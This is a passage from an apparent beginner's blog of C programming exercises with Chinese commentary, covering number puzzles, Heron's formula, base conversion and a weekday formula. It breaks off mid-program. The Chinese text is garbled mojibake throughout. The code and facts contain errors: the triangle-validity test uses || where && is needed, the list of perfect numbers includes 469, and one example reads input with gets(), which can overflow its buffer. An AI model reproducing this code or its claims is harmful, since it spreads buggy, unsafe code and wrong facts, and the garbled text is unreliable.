<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€äº›æ­£æ•´æ•°(ä»¥0ç»“æŸ)ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">			<span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;i%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						s++;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">					&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;â€”â€”â€”â€”èƒ½è¢«3æ•´é™¤çš„å¶æ•° å…±%dä¸ªï¼\n&quot;</span>,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/3.jpg"></p>
<h2 id="è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯"><a href="#è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯" class="headerlink" title="è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯"></a>è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯</h2><h3 id="æµ·ä¼¦å…¬å¼ï¼š"><a href="#æµ·ä¼¦å…¬å¼ï¼š" class="headerlink" title="æµ·ä¼¦å…¬å¼ï¼š"></a>æµ·ä¼¦å…¬å¼ï¼š</h3><p>æµ·ä¼¦å…¬å¼ï¼Œä¼ è¯´ä¸­æ˜¯å¤ä»£çš„å™æ‹‰å¤å›½ç‹å¸Œä¼¦äºŒä¸–å‘ç°çš„å…¬å¼ï¼Œåˆ©ç”¨ä¸‰è§’å½¢çš„ä¸‰è¾¹æ¥æ±‚ä¸‰è§’å½¢çš„é¢ç§¯ï¼Œä½†åäººæ±‚è¯å‡ºæ­¤å…¬å¼å…¶å®æ˜¯ <strong>é˜¿åŸºç±³å¾·</strong>è¿™ä¸ªè€å¤´å‘ç°çš„ï¼  ï¼ˆè¯¦ç»†æƒ…å†µè¯·è‡ªè¡Œç™¾ç§‘ï¼šï¼‰  </p>
<p>ps:ä¸­å›½å®‹ä»£çš„æ•°å­¦å®¶ç§¦ä¹éŸ¶åœ¨1247å¹´ç‹¬ç«‹æå‡ºäº†â€œä¸‰æ–œæ±‚ç§¯æœ¯â€ </p>
<!--more-->

<p>ä¸€ä¸ªä¸‰è§’å½¢ ä¸‰è¾¹åˆ†åˆ«ä¸ºï¼š aã€bã€cï¼Œsä¸ºé¢ç§¯  </p>
<p><em>s=(a+b+c)/2</em>  </p>
<p><em>s=æ ¹å·{s(s-a)(s-b)(s-c)}</em> </p>
<p>æ­¤å…¬å¼å°±æ‘†è„±äº† é«˜ä¸åº•  </p>
<h3 id="includeâ€math-hâ€"><a href="#includeâ€math-hâ€" class="headerlink" title="#includeâ€math.hâ€"></a>#includeâ€math.hâ€</h3><p><strong>&lt;math.h&gt;</strong> å¤´æ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—ä¸æ•°å­¦è®¡ç®—ç›¸å…³çš„å‡½æ•°å’Œå®ã€‚  </p>
<h3 id="sqrt-å¹³æ–¹æ ¹è®¡ç®—"><a href="#sqrt-å¹³æ–¹æ ¹è®¡ç®—" class="headerlink" title="sqrt(å¹³æ–¹æ ¹è®¡ç®—)"></a>sqrt(å¹³æ–¹æ ¹è®¡ç®—)</h3><p>sqrt å°±æ˜¯å…¬å¼ä¸­çš„æ ¹å·ï¼Œç”¨æ³•ï¼š sqrt(xxxx)</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸‰è§’å½¢çš„ä¸‰è¾¹é•¿ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f%f%f&quot;</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// ä¸¤è¾¹ä¹‹å’Œå¤§äºç¬¬ä¸‰è¾¹ </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//æµ·ä¼¦å…¬å¼ </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ä¸‰è§’å½¢çš„é¢ç§¯ï¼š%f\n&quot;</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç­‰è¾¹ä¸‰è§’å½¢ï¼\n&quot;</span>);	<span class="comment">//åˆ¤æ–­ç­‰è¾¹ </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç­‰è…°ä¸‰è§’å½¢ï¼\n&quot;</span>);<span class="comment">//åˆ¤æ–­ç­‰è…° </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//åˆ¤æ–­ç›´è§’ </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç›´è§’ä¸‰è§’å½¢ï¼\n&quot;</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šæ™®é€šä¸‰è§’å½¢ï¼\n&quot;</span>);<span class="comment">//å…¶ä»–æ™®é€šä¸‰è§’å½¢ </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ä¸èƒ½æ„æˆä¸‰è§’å½¢ï¼\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/333.jpg"></p>
<h2 id="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶"><a href="#åè¿›åˆ¶è½¬äºŒè¿›åˆ¶" class="headerlink" title="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶"></a>åè¿›åˆ¶è½¬äºŒè¿›åˆ¶</h2><p>ç¼–å†™ä¸€ä¸ªCç¨‹åºå®ç°è¿›åˆ¶è½¬æ¢ï¼š  </p>
<p>10 to 2:</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼š&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åè¿›åˆ¶ï¼š%d\näºŒè¿›åˆ¶%ld\n&quot;</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/33.png"></p>
<h2 id="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„"><a href="#åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„" class="headerlink" title="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„"></a>åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„</h2><p>ç¼–å†™ä¸€ä¸ªcç¨‹åºå®ç°ä½¿ç”¨æ•°ç»„è¿›è¡Œè¿›åˆ¶è½¬æ¢ï¼š  </p>
<p>10 to 2ï¼š  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i=<span class="number">0</span>,x;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;please enter number:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åè¿›åˆ¶:%d\n&quot;</span>,x);</span><br><span class="line">	<span class="keyword">while</span>(x)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=x%<span class="number">2</span>;</span><br><span class="line">			x/=<span class="number">2</span>;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;äºŒè¿›åˆ¶:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i--;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/4.png"></p>
<h2 id="æ°´ä»™èŠ±"><a href="#æ°´ä»™èŠ±" class="headerlink" title="æ°´ä»™èŠ±"></a>æ°´ä»™èŠ±</h2><p>æ°´ä»™èŠ±æ•°ï¼ˆNarcissistic numberï¼‰ä¹Ÿè¢«ç§°ä¸ºè¶…å®Œå…¨æ•°å­—ä¸å˜æ•°ï¼ˆpluperfect digital invariant, PPDIï¼‰ã€è‡ªæ‹æ•°ã€è‡ªå¹‚æ•°ã€é˜¿å§†æ–¯å£®æ•°æˆ–é˜¿å§†æ–¯ç‰¹æœ—æ•°ï¼ˆArmstrong numberï¼‰ï¼Œæ°´ä»™èŠ±æ•°æ˜¯æŒ‡ä¸€ä¸ª 3 ä½æ•°ï¼Œå®ƒçš„æ¯ä¸ªä½ä¸Šçš„æ•°å­—çš„ 3æ¬¡å¹‚ä¹‹å’Œç­‰äºå®ƒæœ¬èº«ï¼ˆä¾‹å¦‚ï¼š1^3 + 5^3+ 3^3 = 153ï¼‰ã€‚  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">sxh</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c,s;</span><br><span class="line">		a=x%<span class="number">10</span>;</span><br><span class="line">		b=x/<span class="number">10</span>%<span class="number">10</span>;</span><br><span class="line">		c=x/<span class="number">100</span>;</span><br><span class="line">		s=a*a*a+b*b*b+c*c*c;</span><br><span class="line">		<span class="keyword">if</span>(x==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ‰€æœ‰çš„æ°´ä»™èŠ±ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(x=<span class="number">100</span>;x&lt;=<span class="number">999</span>;x++)			</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(sxh(x))</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,x);</span><br><span class="line">		&#125;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/5.png"></p>
<h2 id="é¡ºåºæŸ¥æ‰¾"><a href="#é¡ºåºæŸ¥æ‰¾" class="headerlink" title="é¡ºåºæŸ¥æ‰¾"></a>é¡ºåºæŸ¥æ‰¾</h2><p>è¾“å…¥ä¸€ä¸ªæ•°ï¼Œç¡®å®šå®ƒåœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ•°è¾“å‡º-1ï¼Œå¦åˆ™è¾“å‡ºå®ƒçš„ä¸‹æ ‡ï¼</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ•°ç»„ï¼š&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nè¯·è¾“å…¥ä½ è¦æŸ¥æ‰¾çš„æ•°å­—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(a[i]==x)</span><br><span class="line">			<span class="keyword">break</span>;			</span><br><span class="line">	<span class="keyword">if</span>(i&lt;N)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dçš„ä¸‹æ ‡ä¸º%d\n&quot;</span>,x,i);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/666.jpg"></p>
<h2 id="æå–æ•°å­—æˆ–å­—æ¯"><a href="#æå–æ•°å­—æˆ–å­—æ¯" class="headerlink" title="æå–æ•°å­—æˆ–å­—æ¯"></a>æå–æ•°å­—æˆ–å­—æ¯</h2><p>è¾“å…¥ä¸€ä¸²å­—ç¬¦æå–å…¶ä¸­çš„æ•°å­—æˆ–å­—æ¯ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=j=<span class="number">0</span>;ch[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//if(ch[i]&gt;=&#x27;a&#x27;&amp;&amp;ch[i]&lt;=&#x27;z&#x27;||ch[i]&gt;=&#x27;A&#x27;&amp;&amp;ch[i]&lt;=&#x27;Z&#x27;) //æå–å­—æ¯ </span></span><br><span class="line">			<span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//æå–æ•°å­— </span></span><br><span class="line">				&#123;</span><br><span class="line">					ch[j]=ch[i];</span><br><span class="line">					j++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	ch[j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/zm.jpg"></p>
<h2 id="åŒæ„æ•°"><a href="#åŒæ„æ•°" class="headerlink" title="åŒæ„æ•°"></a>åŒæ„æ•°</h2><p>æ­£æ•´æ•°nè‹¥æ˜¯å®ƒå¹³æ–¹æ•°çš„å°¾éƒ¨ï¼Œåˆ™ç§°nä¸ºåŒæ„æ•°ã€‚  </p>
<p>ä¾‹å¦‚ï¼š5çš„å¹³æ–¹æ•°æ˜¯25ï¼Œä¸”5å‡ºç°åœ¨25çš„å³ä¾§ï¼Œé‚£ä¹ˆ5å°±æ˜¯ä¸€ä¸ªåŒæ„æ•°.ã€‚  </p>
<p>è¾“å‡º 1000 ä»¥å†…çš„åŒæ„æ•°ï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å†…çš„åŒæ„æ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			s=i*i;</span><br><span class="line">			<span class="keyword">if</span>(s%<span class="number">10</span>==i||s%<span class="number">100</span>==i||s%<span class="number">1000</span>==i)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%d---%d &quot;</span>,i,s);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/t.jpg"></p>
<h2 id="åŒæ„æ•°-1"><a href="#åŒæ„æ•°-1" class="headerlink" title="åŒæ„æ•°"></a>åŒæ„æ•°</h2><p>æ­£æ•´æ•°nè‹¥æ˜¯å®ƒå¹³æ–¹æ•°çš„å°¾éƒ¨ï¼Œåˆ™ç§°nä¸ºåŒæ„æ•°ã€‚  </p>
<p>ä¾‹å¦‚ï¼š5çš„å¹³æ–¹æ•°æ˜¯25ï¼Œä¸”5å‡ºç°åœ¨25çš„å³ä¾§ï¼Œé‚£ä¹ˆ5å°±æ˜¯ä¸€ä¸ªåŒæ„æ•°.ã€‚  </p>
<p>è¾“å‡º 1000 ä»¥å†…çš„åŒæ„æ•°ï¼š</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(t(i)==<span class="number">1</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pp=<span class="number">0</span>;</span><br><span class="line">	pp=n*n;</span><br><span class="line">	<span class="keyword">while</span>(n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(n%<span class="number">10</span>!=pp%<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		n/=<span class="number">10</span>;</span><br><span class="line">		pp/=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/tong.jpg"></p>
<h2 id="å®Œå…¨æ•°ï¼ˆPerfect-numberï¼‰"><a href="#å®Œå…¨æ•°ï¼ˆPerfect-numberï¼‰" class="headerlink" title="å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰"></a>å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰</h2><p>åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºå®Œå…¨æ•°ï¼ˆPerfect numberï¼‰  </p>
<p>å¦‚æœä¸€ä¸ªæ•°æ°å¥½ç­‰äºå®ƒçš„å› å­ä¹‹å’Œï¼Œåˆ™ç§°è¯¥æ•°ä¸ºâ€œå®Œå…¨æ•°â€  </p>
<p>å¦‚ï¼š 6 ï¼Œ28, 469 â€¦â€¦  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number,sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;number);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">				sum+=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(number==sum)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dæ˜¯å®Œæ•°\n&quot;</span>,number);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dä¸æ˜¯å®Œæ•°\n&quot;</span>,number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/01.jpg"></p>
<h2 id="åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼"><a href="#åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼" class="headerlink" title="åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼"></a>åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼</h2><p>é€šè¿‡ä½¿ç”¨åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼è®¡ç®—æ˜ŸæœŸå‡ ï¼ï¼ï¼  </p>
<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
<p>å…¬å¼ä¸­dè¡¨ç¤ºæ—¥æœŸä¸­çš„æ—¥æ•°ï¼Œmè¡¨ç¤ºæœˆä»½æ•°ï¼Œyè¡¨ç¤ºå¹´æ•°  </p>
<p><strong>æ³¨æ„</strong>ï¼šæŠŠä¸€æœˆå’ŒäºŒæœˆçœ‹æˆæ˜¯ä¸Šä¸€å¹´çš„åä¸‰æœˆå’Œåå››æœˆï¼Œä¾‹ï¼šå¦‚æœæ˜¯2004-1-10åˆ™æ¢ç®—æˆï¼š2003-13-10æ¥ä»£å…¥å…¬å¼è®¡ç®—ã€‚</p>
<p>æºä»£ç ï¼š  </p>
<h2 id="â‘ ï¼š"><a href="#â‘ ï¼š" class="headerlink" title="â‘ ï¼š"></a>â‘ ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">&quot;Sunday&quot;</span>,<span class="string">&quot;Monday&quot;</span>,<span class="string">&quot;Tuesday&quot;</span>,<span class="string">&quot;Wednesday&quot;</span>,<span class="string">&quot;Thursday&quot;</span>,<span class="string">&quot;Friday&quot;</span>,<span class="string">&quot;Saturday&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span 